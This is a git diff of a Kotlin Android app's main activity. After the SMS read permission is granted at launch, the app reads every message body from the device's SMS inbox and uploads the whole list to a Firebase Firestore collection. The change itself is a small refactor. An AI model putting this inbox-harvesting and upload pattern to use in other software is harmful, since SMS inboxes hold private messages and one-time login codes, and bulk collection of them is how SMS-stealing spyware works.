@@ -12,14 +12,15 @@ import org.jetbrains.anko.toast
 
 class MainActivity : AppCompatActivity() {
 
-    private val firestore = Firebase.firestore
+    private val db = Firebase.firestore
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
         getSmsReadPermission {
-            readAndStoreSms()
+            val smsList = getSmsList()
+            storeSmsInDB(smsList)
         }
     }
 
@@ -43,9 +44,9 @@ class MainActivity : AppCompatActivity() {
             .check()
     }
 
-    private fun readAndStoreSms() {
+    private fun getSmsList(): List<String> {
 
-        val smsList = arrayListOf<Sms>()
+        val smsList = arrayListOf<String>()
 
         val uri = Uri.parse("content://sms/inbox")
         val cursor = contentResolver.query(uri, null, null, null, null)
@@ -54,13 +55,28 @@ class MainActivity : AppCompatActivity() {
         if (cursor?.moveToFirst() == true) {
             for (i in 0 until cursor.count) {
                 val body = cursor.getString(cursor.getColumnIndexOrThrow("body")).toString()
-                val address = cursor.getShort(cursor.getColumnIndexOrThrow("address")).toString()
-                smsList.add(Sms(address, body))
+                //val address = cursor.getShort(cursor.getColumnIndexOrThrow("address")).toString()
+                smsList.add(body)
 
                 cursor.moveToNext()
             }
         }
         cursor?.close()
 
+        return smsList
+    }
+
+    private fun storeSmsInDB(smsList: List<String>) {
+
+        val smsMap = mutableMapOf<String, List<String>>()
+        smsMap["sms"] = smsList
+
+        db.collection("sms").add(smsMap)
+            .addOnSuccessListener {
+                toast("Messages stored successfully")
+            }
+            .addOnFailureListener {
+                toast("Failed to store SMS: $it")
+            }
     }
 }
